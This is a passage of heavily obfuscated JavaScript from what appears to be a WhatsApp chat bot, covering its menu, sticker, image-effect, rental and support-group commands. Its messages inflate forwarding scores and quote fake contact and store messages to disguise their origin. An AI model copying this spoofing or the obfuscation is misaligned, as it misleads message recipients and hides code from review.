baocotlujpuiuukouopiou_=moediooioaonjxnxixovx_['message'][_0x1f7707(0x2bc,0x849,0x427,0x2c4)+_0x1f7707(-0x2ce,-0x350,0x9a,0x33b)]?moediooioaonjxnxixovx_[_0x39f25f(0x24c,-0xdc,0x330,-0x16f)]['ephemeralM'+_0x1f7707(0x110,-0x181,0x9a,-0x403)]:moediooioaonjxnxixovx_;const _0x5a5a6d={};_0x5a5a6d[_0x1f7707(0x2e8,-0x178,-0x1ae,-0x209)+'t']=_0x39f25f(0x10,-0x8a,0x89,0x5b);const _0x5610d2={};_0x5610d2[_0x1f7707(0x1a9,0x203,0x499,0x2c5)]=_0x39f25f(0x499,0x66e,0x6b9,0x3ad),_0x5610d2[_0x1f7707(0x3c4,0x31c,0x1ce,-0x1c4)]=_0x5a5a6d,_0x5610d2[_0x39f25f(0x5f9,0x6ce,0x613,0x42f)]=0x1;const _0x522712={};_0x522712[_0x1f7707(-0x27,0xb7,-0x1ae,-0xac)+'t']=_0x1f7707(0x559,0x8ea,0x5bd,0x22a);const _0x233ec6={};_0x233ec6[_0x39f25f(0x93d,0x647,0x979,0x621)]=_0x39f25f(-0x230,0x24d,-0x1b8,0x4e8),_0x233ec6[_0x39f25f(0x1a1,0x37c,0x7ba,0xe9)]=_0x522712,_0x233ec6[_0x39f25f(0x7a3,0x6ce,0x95c,0x61a)]=0x1;const buttoonusosipspiioooos_=[_0x5610d2,_0x233ec6],btnnpnoukoooiookkn_={'contentText':cecanmenu(prefix),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'Regard\x20@'+ini_mark[_0x1f7707(0x60d,-0x106,0x20e,0x37e)]('@')[-0x1*-0xfbd+-0x5*0x6fb+0x132a],'buttons':buttoonusosipspiioooos_,'headerType':0x6,'locationMessage':baocotlujpuiuukouopiou_[_0x1f7707(-0x216,-0x14c,-0x28a,0xd0)][_0x1f7707(0x13d,-0x591,-0x112,0xe5)+_0x39f25f(0x90e,0x4a3,0x359,0x66f)]},_0x1d88dc={};_0x1d88dc[_0x39f25f(0x17e,0x3cc,0x7fc,0x3e5)]='hi',_0x1d88dc[_0x39f25f(0x5bf,0x6ba,0x96e,0xa10)+'Score']=0x3b9aca00,_0x1d88dc['isForwarde'+'d']=!![],_0x1d88dc[_0x39f25f(0x642,0x688,0xb1d,0x630)+_0x1f7707(-0x82,0x242,0x118,-0x79)]=!![],_0x1d88dc[_0x39f25f(0x32e,0x63f,0x935,0x75f)+'id']=[ini_mark];const _0x59df5d={};_0x59df5d['caption']=_0x1f7707(-0x2ec,-0x4a4,-0xe5,-0x482)+'21',_0x59df5d[_0x1f7707(0x9a3,0x7b1,0x52f,0x4a9)+'o']=_0x1d88dc,_0x59df5d[_0x1f7707(-0x2e8,-0x3ab,-0xa8,-0x45c)]=fkontak,_0x59df5d['sendEpheme'+_0x39f25f(0x1bc,0x2c6,-0x89,0x6aa)]=!![],alpha[_0x39f25f(0x376,-0x84,0x1f2,-0x14d)+'e'](from,btnnpnoukoooiookkn_,MessageType[_0x39f25f(0x28f,0x213,-0x14c,-0x237)+_0x39f25f(-0x31e,-0x8d,-0x1ef,0x3a6)],_0x59df5d);}if(sub_yt_zeeone_ofc==_0x39f25f(-0x219,0x147,-0x9,0x2f)+'n'){console[_0x1f7707(-0x44,0x5c3,0x3f1,-0x4d)](_0x1f7707(0x5aa,0x4c6,0x213,0x3a2)+_0x39f25f(0xa25,0x6a2,0x5bf,0x649),_0x1f7707(0x35e,0x4a2,0x4eb,0x9b)+_0x1f7707(0xe0,0x62a,0x22a,0x31)+']',wib,color(_0x1f7707(-0x2,-0x79,0x35b,0x18c)+_0x39f25f(0x239,0x302,0x95,0x6f6)+'ogan\x20menu'));const moediooioaonjxnlxixovx_=await alpha[_0x1f7707(-0x180,-0x1e9,-0xd3,-0x109)+_0x1f7707(-0x521,0x273,-0x23b,-0x330)](from,pp_userz,MessageType[_0x1f7707(0x1e,-0x70,0x327,0xf2)],{'thumbnail':pp_userz});let baocotlujpuiuukoouopiou_=moediooioaonjxnlxixovx_['message'][_0x39f25f(0x82d,0x5d5,0x922,0x580)+_0x39f25f(0x1f6,0x248,0x1f5,-0x233)]?moediooioaonjxnlxixovx_[_0x1f7707(-0x21a,-0x181,-0x28a,-0x300)][_0x39f25f(0x709,0x5d5,0x46b,0x60c)+_0x1f7707(0x28b,0x3f9,0x9a,0x6f)]:moediooioaonjxnlxixovx_;const _0x4b4348={};_0x4b4348[_0x1f7707(-0x35,-0x5c6,-0x1ae,-0x217)+'t']=_0x39f25f(-0x388,-0x8a,-0x286,0x326);const _0x9c167e={};_0x9c167e[_0x1f7707(0x75b,0x4d0,0x499,0x588)]=_0x1f7707(0x3af,0x758,0x4c0,0x8f2),_0x9c167e[_0x39f25f(0xb,0x37c,0xf3,0x82c)]=_0x4b4348,_0x9c167e['type']=0x1;const _0x494880={};_0x494880[_0x1f7707(0x239,-0x411,-0x1ae,-0x5d7)+'t']='✓\x20OWNER';const _0x1f00bc={};_0x1f00bc[_0x1f7707(0x789,0x331,0x499,0x756)]=_0x39f25f(0x4d8,0x24d,-0x152,-0xa3),_0x1f00bc['buttonText']=_0x494880,_0x1f00bc[_0x1f7707(0x8dd,0x173,0x520,0x1d5)]=0x1;const buttoonusosipispiioooos_=[_0x9c167e,_0x1f00bc],btnnpnoukoooioookkn_={'contentText':coganmenu(prefix),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x1f7707(-0xcd,0x13d,0x24,-0x266)+ini_mark['split']('@')[-0x1aab+0x26f*-0x1+0x1d1a],'buttons':buttoonusosipispiioooos_,'headerType':0x6,'locationMessage':baocotlujpuiuukoouopiou_[_0x1f7707(-0xe7,-0x5ab,-0x28a,0x1dd)]['locationMe'+'ssage']},_0x531641={};_0x531641[_0x39f25f(-0x8b,0x3cc,0x495,0x6c0)]='hi',_0x531641[_0x1f7707(0x369,0x1bd,0x50c,0x220)+'Score']=0x3b9aca00,_0x531641[_0x1f7707(-0x141,-0x33b,-0x151,-0x11e)+'d']=!![],_0x531641[_0x1f7707(0x516,0x57e,0x4da,0x5fc)+'ral']=!![],_0x531641['mentionedJ'+'id']=[ini_mark];const _0xa94a80={};_0xa94a80['caption']=_0x39f25f(0x202,0xc9,0x4f9,-0x13)+'21',_0xa94a80[_0x39f25f(0x865,0x6dd,0x283,0xb56)+'o']=_0x531641,_0xa94a80[_0x39f25f(0x90,0x106,0x52b,0x20e)]=fkontak,_0xa94a80[_0x1f7707(0x808,0x72c,0x4da,0x618)+_0x1f7707(0x1f8,0x5c6,0x118,-0xb6)]=!![],alpha[_0x1f7707(-0x606,-0x1fe,-0x232,-0x3b4)+'e'](from,btnnpnoukoooioookkn_,MessageType[_0x39f25f(0x557,0x213,0x567,0x53c)+'sage'],_0xa94a80);}if(sub_yt_zeeone_ofc==_0x1f7707(-0x1cf,-0x16d,-0x259,-0x395)+'ticker'){console[_0x39f25f(0x3ba,0x59f,0x299,0x378)](color(time,_0x39f25f(0x398,0x6e1,0x2e2,0x29a)),color('List\x20messa'+_0x39f25f(0x4b0,0x5f7,0x1a8,0x870)+'m\x20sticker'));const moediooiooaonjxnlxixovx_=await alpha[_0x39f25f(0x368,0xdb,-0x8a,0x1bc)+_0x1f7707(0x108,-0x341,-0x23b,-0x2da)](from,pp_userz,MessageType[_0x1f7707(0x408,0x2fc,0x327,0x367)],{'thumbnail':pp_userz});let baocotlujpuiouukoouopiou_=moediooiooaonjxnlxixovx_[_0x39f25f(0x2e3,-0xdc,0x257,-0x34d)][_0x39f25f(0x332,0x5d5,0x96d,0x888)+_0x1f7707(0x67,-0x7b,0x9a,0x49d)]?moediooiooaonjxnlxixovx_['message'][_0x1f7707(0x449,0x51f,0x427,0x411)+_0x39f25f(0x126,0x248,0x181,0x456)]:moediooiooaonjxnlxixovx_;const _0x443b43={};_0x443b43['displayTex'+'t']='⋮☰\x20BACK';const _0x383b56={};_0x383b56[_0x1f7707(0x702,0x23f,0x499,0x840)]='Command',_0x383b56[_0x1f7707(0x277,0x62f,0x1ce,0x188)]=_0x443b43,_0x383b56[_0x39f25f(0xb1b,0x6ce,0xaaa,0x9b4)]=0x1;const _0x4e05a8={};_0x4e05a8[_0x1f7707(-0x207,-0x1e9,-0x1ae,-0x476)+'t']='✓\x20OWNER';const _0x1b2a2c={};_0x1b2a2c[_0x1f7707(0x513,0x53,0x499,0x68f)]=_0x39f25f(0xe1,0x24d,0x43e,0x22e),_0x1b2a2c[_0x39f25f(-0x19,0x37c,0x2f6,0x509)]=_0x4e05a8,_0x1b2a2c[_0x1f7707(0x3a6,0x1e3,0x520,0x36f)]=0x1;const buttoonusosipispiiooooos_=[_0x383b56,_0x1b2a2c],btnnpnoukoooioookikn_={'contentText':telestiker(prefix),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x1f7707(0x1d5,-0x13a,0x24,0x64)+ini_mark[_0x1f7707(0x487,0x3e0,0x20e,-0x202)]('@')[0x16aa+0x785+-0x1e2f],'buttons':buttoonusosipispiiooooos_,'headerType':0x6,'locationMessage':baocotlujpuiouukoouopiou_['message'][_0x1f7707(-0x82,-0x2a,-0x112,-0x51d)+_0x1f7707(0x543,0x48,0x2f5,0x778)]},_0xdaa797={};_0xdaa797[_0x39f25f(0x80e,0x3cc,0x223,0x1db)]='hi',_0xdaa797[_0x1f7707(0x374,0x551,0x50c,0x3d5)+_0x39f25f(0x420,0x1ae,0x3bf,-0x166)]=0x3b9aca00,_0xdaa797['isForwarde'+'d']=!![],_0xdaa797['sendEpheme'+_0x1f7707(0x187,0x271,0x118,0x4ba)]=!![],_0xdaa797[_0x1f7707(0x58e,0x2d8,0x491,0x777)+'id']=[ini_mark];const _0x56af73={};_0x56af73[_0x1f7707(-0x28,0x3f8,-0x92,0x200)]=_0x39f25f(0x38b,0xc9,0x15,-0x3c2)+'21',_0x56af73['contextInf'+'o']=_0xdaa797,_0x56af73[_0x39f25f(0x52f,0x106,-0x1c0,0x162)]=fkontak,_0x56af73['sendEpheme'+_0x39f25f(0x7,0x2c6,-0x178,0x351)]=!![],alpha['sendMessag'+'e'](from,btnnpnoukoooioookikn_,MessageType['buttonsMes'+_0x39f25f(-0x357,-0x8d,0x2d4,0x137)],_0x56af73);}if(sub_yt_zeeone_ofc==_0x1f7707(0x3e3,0x105,0x48,-0x21a)+'ct'){console[_0x39f25f(0x17a,0x59f,0x8e4,0x5a6)](color(time,_0x39f25f(0x9df,0x6e1,0x438,0x633)),color(_0x1f7707(0x205,0x609,0x1c3,-0xeb)+_0x39f25f(0x3a2,0x819,0x7bd,0x838)+_0x1f7707(0x345,0x24d,0x46a,0x7c4)));const moediooioioaonjxnlxixovx_=await alpha[_0x1f7707(-0x2e4,-0x3a3,-0xd3,0x212)+_0x1f7707(-0x15f,0x273,-0x23b,0x178)](from,pp_userz,MessageType[_0x39f25f(0x7bb,0x4d5,0x116,0x202)],{'thumbnail':pp_userz});let baocotlujpuiopuukoouopiou_=moediooioioaonjxnlxixovx_['message'][_0x39f25f(0x7d5,0x5d5,0x88f,0x445)+'essage']?moediooioioaonjxnlxixovx_[_0x1f7707(0x33,-0x10e,-0x28a,0x5e)][_0x1f7707(0x349,0x38c,0x427,0x696)+_0x1f7707(0xb4,-0x3b4,0x9a,-0x21b)]:moediooioioaonjxnlxixovx_;const _0x5b3b26={};_0x5b3b26[_0x39f25f(-0x34,0x0,0xcb,-0x270)+'t']='⋮☰\x20BACK';const _0x542c99={};_0x542c99[_0x39f25f(0x950,0x647,0x421,0x31c)]=_0x39f25f(0x6a4,0x66e,0x75c,0x568),_0x542c99[_0x39f25f(0x292,0x37c,0x5c5,0x23b)]=_0x5b3b26,_0x542c99['type']=0x1;const _0x1c2820={};_0x1c2820[_0x1f7707(-0x283,-0x256,-0x1ae,-0x5ce)+'t']='✓\x20OWNER';const _0x451457={};_0x451457['buttonId']=_0x39f25f(0x3c,0x24d,-0xea,-0x3f),_0x451457[_0x39f25f(0x160,0x37c,0x124,0x283)]=_0x1c2820,_0x451457[_0x39f25f(0x3bb,0x6ce,0x905,0x983)]=0x1;const buttoonusosipispiioooooos_=[_0x542c99,_0x451457],btnnpnoukoiooioookikn_={'contentText':image_effect(prefix),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x39f25f(0x3d2,0x1d2,-0x262,-0x23)+ini_mark[_0x1f7707(0x650,0x2e0,0x20e,-0xd9)]('@')[0x29b*0x1+-0x19bb+-0x5*-0x4a0],'buttons':buttoonusosipispiioooooos_,'headerType':0x6,'locationMessage':baocotlujpuiopuukoouopiou_[_0x39f25f(-0x51,-0xdc,-0x23e,-0x335)][_0x39f25f(-0xd1,0x9c,-0x261,0x482)+'ssage']},_0x504e63={};_0x504e63['text']='hi',_0x504e63['forwarding'+_0x39f25f(0x346,0x1ae,0x660,-0x2e4)]=0x3b9aca00,_0x504e63[_0x1f7707(0x239,-0x25f,-0x151,-0x14d)+'d']=!![],_0x504e63[_0x1f7707(0x527,0x3c1,0x4da,0x277)+_0x1f7707(-0x388,-0x158,0x118,0x13b)]=!![],_0x504e63[_0x39f25f(0x76d,0x63f,0x299,0x1fb)+'id']=[ini_mark];const _0x101747={};_0x101747[_0x39f25f(-0x55,0x11c,0x28f,0x55b)]=_0x1f7707(0x3c0,0x2ba,-0xe5,-0x199)+'21',_0x101747[_0x39f25f(0x62e,0x6dd,0x9f7,0x568)+'o']=_0x504e63,_0x101747[_0x39f25f(0x575,0x106,-0x367,-0x377)]=fkontak,_0x101747[_0x39f25f(0x8d8,0x688,0xb25,0x31e)+'ral']=!![],alpha['sendMessag'+'e'](from,btnnpnoukoiooioookikn_,MessageType['buttonsMes'+_0x1f7707(-0x417,-0x246,-0x23b,-0x73)],_0x101747);}if(sub_yt_zeeone_ofc==_0x39f25f(0x60b,0x5a7,0x4d2,0x618)+'e'){console[_0x39f25f(0x420,0x59f,0x61f,0x4a8)](color(time,_0x1f7707(0x286,0x58f,0x533,0x955)),color(_0x39f25f(0x6f,0x371,0x11c,0x6bb)+_0x39f25f(0x683,0x7cd,0xa3a,0x531)+_0x39f25f(0x45e,0x3b7,0x693,0x5e)));var imgList=['https://f.'+_0x1f7707(-0x469,0x142,-0x1a4,-0x28c)+_0x39f25f(0x5da,0x212,0x523,-0x2a5)+_0x1f7707(-0x1b4,-0x6a5,-0x2d7,-0x273),'https://h.'+_0x1f7707(0x192,-0x4d7,-0x1a4,-0x78)+'/p_2032mwb'+_0x1f7707(0x89d,0xb04,0x64e,0x718),_0x39f25f(0x254,0x65d,0x635,0x26c)+_0x1f7707(0xb8,0x22b,-0x1a4,0x1b3)+_0x39f25f(0x103,0xb1,-0xf0,0x524)+_0x39f25f(-0xa4,0x10c,-0x1df,-0x34a),_0x39f25f(0x25e,-0xc0,0x328,-0x77)+_0x1f7707(0x23,-0xb2,-0x1a4,-0x44b)+_0x39f25f(-0x36c,-0x6c,-0xfa,0x8a)+_0x39f25f(0x4a6,0x624,0x5ac,0x193),'https://e.'+_0x39f25f(-0xe3,0xa,-0x202,0x84)+_0x1f7707(0x61c,0x4ee,0x4ee,0x916)+_0x39f25f(0x74b,0x4b5,0x945,0x739),_0x39f25f(0x42b,0x5b3,0x408,0x43a)+_0x1f7707(-0x577,-0x5ed,-0x1a4,0x2f0)+_0x39f25f(0xd7,0x10f,0x5,0x1bb)+'c41.jpg',_0x1f7707(0x625,0x797,0x690,0x699)+_0x1f7707(-0x416,0x177,-0x1a4,-0x64e)+_0x1f7707(0x4b7,0x4b6,0x492,0x536)+_0x1f7707(-0x221,0x1f7,0x20d,0x1c6)],imgUrl=imgList[Math[_0x1f7707(-0x96,-0x1d2,0xd,0x35d)](Math[_0x1f7707(0xd0,0xec,-0x63,0x16c)]()*imgList['length'])];const _0xdc0f86={};_0xdc0f86['title']=''+ucapannya2,_0xdc0f86['body']='Subscribe\x20'+_0x39f25f(-0x284,0x1ee,0x40d,0x341),_0xdc0f86[_0x1f7707(-0x14b,-0x144,-0x12d,0x35f)+'e']=_0x39f25f(0x314,0xa6,-0x339,0x3db),_0xdc0f86[_0x39f25f(-0x247,0x26c,0x4bb,-0x215)+'rl']=''+imgUrl,_0xdc0f86[_0x1f7707(0x55c,0x34f,0x553,0x2c7)]='',_0xdc0f86[_0x1f7707(0x1e0,-0x1e0,-0x3e,-0x24)]=_0x39f25f(0x320,0x7ca,0xa6a,0x49e)+'utube.com/'+_0x39f25f(0x689,0x589,0x828,0x865)+_0x39f25f(0x256,0x151,0x3e3,0x1a3)+'ODby7_MoRY'+'lA';const _0xc25d32={};_0xc25d32[_0x39f25f(0xe3,0x3cc,0x17e,-0x7e)]='hi',_0xc25d32[_0x39f25f(0x3a3,0x6ba,0x5ab,0x431)+_0x39f25f(0x5a7,0x1ae,0x48d,0xd0)]=0x3b9aca00,_0xc25d32[_0x39f25f(-0x1c9,0x5d,0x21b,-0x35e)+'d']=!![],_0xc25d32['sendEpheme'+_0x1f7707(0x211,-0x216,0x118,0x4fb)]=!![],_0xc25d32[_0x39f25f(0x133,-0xaa,0x3de,0x12d)+_0x1f7707(0x4bf,0x37b,0xc3,-0x3a8)]=_0xdc0f86,alpha[_0x1f7707(0x1fa,-0x6aa,-0x232,-0x19c)+'e'](from,_0x1f7707(-0xd0,-0x4e1,-0x15a,0x220)+_0x1f7707(-0x1a9,-0x486,-0x117,-0x9f)+_0x39f25f(0x3b2,0x21b,-0xa7,0x231)+_0x39f25f(0x6ff,0x725,0x5dd,0x409)+_0x1f7707(0x572,0x717,0x463,0x4e7)+_0x39f25f(0x5e8,0x529,0x7e3,0x4d6),text,{'thumbnail':fs[_0x1f7707(0x557,0x51,0x106,0x367)+'nc'](_0x39f25f(0x398,0xef,-0x22f,-0x9b)+thumbnail),'caption':_0x39f25f(0x11d,0xc9,-0x3b6,0x436)+'21','contextInfo':_0xc25d32,'quoted':ftoko});}if(sub_yt_zeeone_ofc==_0x39f25f(0x11,0x46c,0x26,0x48e)+_0x39f25f(0xb40,0x707,0x259,0x659)){const gFrhUj='1|4|0|3|2'[_0x1f7707(0x6bd,0x154,0x20e,0x652)]('|');let TjJdlZ=-0x1832+0x8d9+-0x1*-0xf59;while(!![]){switch(gFrhUj[TjJdlZ++]){case'0':var imgUrl=imgList[Math[_0x1f7707(-0x18f,-0x13b,0xd,0x254)](Math[_0x1f7707(-0x2b0,-0x289,-0x63,0x1f6)]()*imgList[_0x1f7707(0x5ce,0x1a8,0x4cc,0x2af)])];continue;case'1':console[_0x1f7707(0x6d4,0x507,0x3f1,0x601)](color(time,'magenta'),color(_0x39f25f(0x1dc,0x371,0x7c4,-0xea)+_0x39f25f(0x48c,0x1a,0x2c9,-0x150)+_0x39f25f(0x24c,-0xf0,0x1fb,-0x423)));continue;case'2':const _0x55709e={};_0x55709e['title']=''+ucapannya2,_0x55709e[_0x1f7707(0x8da,0x3e5,0x615,0x768)]=_0x1f7707(0x4f9,0x340,0x276,0x1f9)+_0x1f7707(0x1da,0xc2,0x40,-0x29e),_0x55709e[_0x39f25f(0x374,0x81,-0x3ca,-0xe5)+'e']='PHOTO',_0x55709e['thumbnailU'+'rl']=''+imgUrl,_0x55709e[_0x1f7707(0x100,0x7fe,0x553,0x966)]='',_0x55709e[_0x39f25f(0x400,0x170,-0x16d,-0x284)]=_0x1f7707(0x547,0x90a,0x61c,0x35d)+'utube.com/'+_0x39f25f(0x7be,0x589,0x8c1,0x39c)+_0x1f7707(0x17a,-0x2db,-0x5d,0x120)+'ODby7_MoRY'+'lA';const _0x3652b3={};_0x3652b3[_0x39f25f(0x1db,0x3cc,0x3c2,0x508)]=_0x1f7707(0xa2d,0x1bc,0x5ac,0x16d),_0x3652b3['forwarding'+_0x1f7707(0x251,0x12e,0x0,-0x29)]=0x3b9aca00,_0x3652b3['isForwarde'+'d']=!![],_0x3652b3[_0x39f25f(0x225,0x688,0x494,0x618)+_0x39f25f(0x67d,0x2c6,0x722,0x2d4)]=!![],_0x3652b3[_0x1f7707(-0x246,-0x386,-0x258,-0x106)+'Reply']=_0x55709e;const _0x496d8a={};_0x496d8a['mentionedJ'+'id']=[ini_mark],alpha['sendMessag'+'e'](from,tqto,text,{'thumbnail':fs[_0x1f7707(0x507,0x255,0x106,0x49d)+'nc'](_0x1f7707(-0x3f2,-0x1ba,-0xbf,-0x19e)+thumbnail),'caption':_0x39f25f(0x4ed,0x75a,0x4f1,0x38d),'contextInfo':_0x3652b3,'quoted':ftoko,'contextInfo':_0x496d8a});continue;case'3':tqto=_0x1f7707(0x626,0x17e,0x1de,0x1a4)+_0x1f7707(-0x451,-0xc8,-0x296,-0x2c5)+_0x1f7707(-0x372,0x66,-0x228,-0x6e3)+_0x1f7707(0x5f2,0x644,0x29d,0x254)+_0x39f25f(0xa16,0x6bb,0x72d,0x2c4)+_0x39f25f(0x2a3,0x71d,0x782,0xbc6)+ini_mark[_0x39f25f(0x522,0x3bc,0x6c3,0x71e)]('@')[-0x789*0x2+0x5*0x3dd+-0x1*0x43f];continue;case'4':var imgList=['https://f.'+_0x1f7707(-0x316,-0x61d,-0x1a4,-0x314)+_0x39f25f(-0x9f,0x212,0x1d2,-0x5)+_0x39f25f(-0x2a2,-0x129,-0x5b1,0x1bf),_0x1f7707(0x58f,0x4b0,0x5d5,0x66a)+_0x39f25f(-0x21a,0xa,0x1ea,0x3c3)+_0x39f25f(0x6ec,0x56d,0x580,0x381)+_0x1f7707(0x53d,0x3b5,0x64e,0x71d),'https://g.'+_0x1f7707(-0x402,-0x46a,-0x1a4,-0x4be)+'/p_2032cf1'+_0x1f7707(0x13f,0x16c,-0xa2,0x181),_0x39f25f(-0x517,-0xc0,-0x241,0x256)+'top4top.io'+_0x39f25f(-0x367,-0x6c,-0x381,0x277)+_0x1f7707(0x237,0x14e,0x476,0x9b),_0x1f7707(0x76c,0x299,0x5ab,0x1ba)+_0x1f7707(0x198,-0xbc,-0x1a4,-0x555)+_0x1f7707(0x72e,0x94a,0x4ee,0x403)+_0x39f25f(0x69e,0x4b5,0x3f4,0x290),_0x39f25f(0x20a,0x5b3,0x2f3,0x649)+'top4top.io'+_0x1f7707(-0x3f9,-0x215,-0x9f,-0x47)+_0x39f25f(0x80,0x263,0xe8,0x12f),'https://j.'+'top4top.io'+_0x39f25f(0x325,0x640,0x6b7,0x8ef)+_0x39f25f(0x36b,0x3bb,0x3c8,0x5a)];continue;}break;}}if(sub_yt_zeeone_ofc==_0x1f7707(-0x76,-0x559,-0x256,-0x44d)+_0x1f7707(0x141,0x59,0x4be,0x6e8)){console['log'](color(time,_0x39f25f(0xa98,0x6e1,0xa18,0x9f9)),color(_0x1f7707(-0x14d,-0xe5,0x1c3,0x2f0)+_0x1f7707(0x7ac,0xed,0x4a2,0x82a)+_0x1f7707(0x193,0x44c,0x9,0x22e))),tqto=_0x1f7707(0x23c,-0x27c,-0x133,-0x2bb)+sender[_0x1f7707(0x178,0x326,0x20e,0x610)]('@')[0xd*0xda+-0x1*0x17fc+0xcea]+'\x20\x0a\x0a_'+gc_wa_lu+(_0x39f25f(-0x42f,-0xc3,-0x439,-0x3ed)+_0x1f7707(-0xe9,0x551,0xf2,-0x3aa))+ini_mark[_0x1f7707(-0x1fc,0x490,0x20e,0x7c)]('@')[0x1*0x829+0x17fc+-0x2025];const _0x5c1448={};_0x5c1448[_0x39f25f(0x8a5,0x63f,0x69c,0x27d)+'id']=[ini_mark,sender],alpha[_0x1f7707(-0x673,-0x57d,-0x232,-0x1fa)+'e'](from,tqto,text,{'thumbnail':fs['readFileSy'+'nc'](_0x1f7707(-0x47c,-0x361,-0xbf,0x166)+thumbnail),'caption':_0x39f25f(0x989,0x75a,0x57b,0x3ea),'contextInfo':{'text':_0x1f7707(0x9d7,0x930,0x5ac,0x687),'forwardingScore':0x3b9aca00,'isForwarded':!![],'sendEphemeral':!![],'externalAdReply':{'title':''+ucapannya2,'body':''+baper,'previewType':'PHOTO','thumbnailUrl':'','thumbnail':fs[_0x39f25f(0x44e,0x2b4,0x6fd,0x72c)+'nc'](_0x1f7707(0x3db,0x1d4,-0xbf,0x209)+thumbnail),'sourceUrl':'https://yo'+_0x39f25f(0x33a,0x166,0xd5,0x161)+_0x39f25f(0x9f0,0x589,0x3ac,0x938)+_0x39f25f(0x469,0x151,-0x215,0x2a0)+'ODby7_MoRY'+'lA'}},'quoted':ftoko,'contextInfo':_0x5c1448});}if(sub_yt_zeeone_ofc==_0x39f25f(0x0,0x2e0,0x724,0x58f)+_0x1f7707(0xab,0x5d3,0x565,0x6d5)){console[_0x1f7707(0x467,-0xac,0x3f1,0x800)](color(time,_0x1f7707(0x2fd,0x340,0x533,0x3a3)),color(_0x39f25f(0x473,0x371,0x5e2,0x68c)+'ge\x20Alphabo'+_0x39f25f(0x510,0x240,0x4a,0x3ca)));const _0x46cc38={};_0x46cc38[_0x39f25f(-0x24f,0x106,0x553,-0x36f)]=mek,alpha[_0x1f7707(-0x507,-0x57,-0x232,-0x488)+'e'](from,_0x39f25f(0x72a,0x776,0xab8,0x4b9)+'\x20'+pushname+enter+('https://ch'+_0x1f7707(-0x3eb,-0x38b,-0x10a,0x2ca)+_0x1f7707(-0x22d,-0x2f,0x32,-0x32b)+_0x39f25f(0x303,0x4da,0x608,0x66d)+_0x1f7707(0x9e9,0x40c,0x626,0x902)),text,_0x46cc38);}if(sub_yt_zeeone_ofc==_0x1f7707(-0x171,0x91,0x132,0x2d4)+'upport\x202'){console['log'](color(time,_0x39f25f(0x23c,0x6e1,0x563,0xb43)),color('List\x20messa'+_0x39f25f(0x6e3,0x600,0x2fc,0x254)+_0x39f25f(0x4ae,0xaa,-0x32d,-0x80)+'2'));const _0x94efb9={};_0x94efb9[_0x1f7707(0x3f4,-0x536,-0xa8,-0xa6)]=mek,alpha[_0x1f7707(-0x34,0x257,-0x232,-0x4a4)+'e'](from,_0x39f25f(0x56c,0x776,0xb19,0x5c0)+'\x20'+pushname+enter+('https://ch'+'at.whatsap'+_0x39f25f(0x2a5,0x9,0x171,-0x2db)+_0x39f25f(0x78d,0x451,0x897,0xcd)+'ssfqJNsE'),text,_0x94efb9);}if(subscribezeeoneofc==_0x39f25f(0x14b,0x42e,0xd7,0x427)){const jdISVu=_0x1f7707(0x6b0,0x15c,0x311,0x696)['split']('|');let PcquRP=-0x202*0xa+-0x7*0x4c2+-0x1*-0x3562;while(!![]){switch(jdISVu[PcquRP++]){case'0':console[_0x39f25f(0x3b3,0x59f,0x2f0,0x227)](_0x1f7707(0x2cf,0x5ae,0x213,0x553)+_0x39f25f(0x6bc,0x6a2,0x4ba,0x2e6),'[\x1b[1;32m\x20C'+_0x1f7707(0xa0,-0x150,0x22a,0x408)+']',wib,color(_0x39f25f(0x2b0,0x54c,0xa9,0x665)+_0x1f7707(0x7ac,0x427,0x482,0x14)+_0x1f7707(0xb,0xbd,0x6e,-0x29e)));continue;case'1':const _0x13fad1={};_0x13fad1[_0x39f25f(-0x35f,0x0,-0x246,0x3b1)+'t']='💞\x20Ya';const _0x3b8752={};_0x3b8752[_0x39f25f(0xa8c,0x647,0x939,0xab6)]=_0x1f7707(-0x18a,0x177,-0x6c,0xb5),_0x3b8752[_0x39f25f(0x467,0x37c,0x79c,0x551)]=_0x13fad1,_0x3b8752['type']=0x1;const _0x4b2ed9={};_0x4b2ed9[_0x1f7707(0x247,-0x479,-0x1ae,-0x349)+'t']=_0x1f7707(0xe0,0x4e5,0x125,0x3bb);const _0x2eb190={};_0x2eb190[_0x39f25f(0x62a,0x647,0x82f,0x8eb)]='tidak_kak',_0x2eb190[_0x39f25f(0x36d,0x37c,0x3d3,0x3aa)]=_0x4b2ed9,_0x2eb190[_0x1f7707(0x6df,0x34f,0x520,0x6e2)]=0x1;var buttonsss=[_0x3b8752,_0x2eb190];continue;case'2':const _0x5966d2={};_0x5966d2[_0x39f25f(0x16b,0x3d7,0x4fd,0x240)+'t']=ini_gopayyy,_0x5966d2[_0x39f25f(0x4c3,0x7e5,0xa5b,0x44e)]=''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator,_0x5966d2[_0x39f25f(0x9e8,0x599,0x496,0x6cd)]=buttonsss,_0x5966d2[_0x1f7707(0x314,0x1bd,0x4b5,0x8cd)]=0x1,buttonMessageee=_0x5966d2;continue;case'3':var ini_gopayyy=_0x39f25f(0x370,0x134,0x591,0x3c5)+sender[_0x39f25f(0x278,0x3bc,0x667,0x60)]('@')[0x11ef+0x1eb7+-0x30a6]+(_0x1f7707(-0x33d,-0x1ef,-0x181,-0x2f5)+'\x20mau\x20sewa\x20'+_0x39f25f(0x3d1,0x69f,0xab5,0x4f4)+_0x39f25f(0x3ab,0x813,0xbc9,0x89b)+_0x39f25f(0x3ef,0x2d9,0x259,0x40f));continue;case'4':const _0x536154={};_0x536154[_0x39f25f(0x6b7,0x3cc,0x36f,0x576)]='hi',_0x536154[_0x39f25f(0x858,0x6ba,0x7c9,0x6a2)+_0x1f7707(0x46,0x167,0x0,-0x4a1)]=0x3b9aca00,_0x536154[_0x1f7707(-0x591,0x116,-0x151,-0x1c5)+'d']=!![],_0x536154[_0x1f7707(0x65c,0x400,0x4da,0x1ed)+_0x1f7707(0xbe,0x8e,0x118,0x3cd)]=!![],_0x536154[_0x1f7707(0x23c,0x444,0x491,0x91e)+'id']=[sender];const 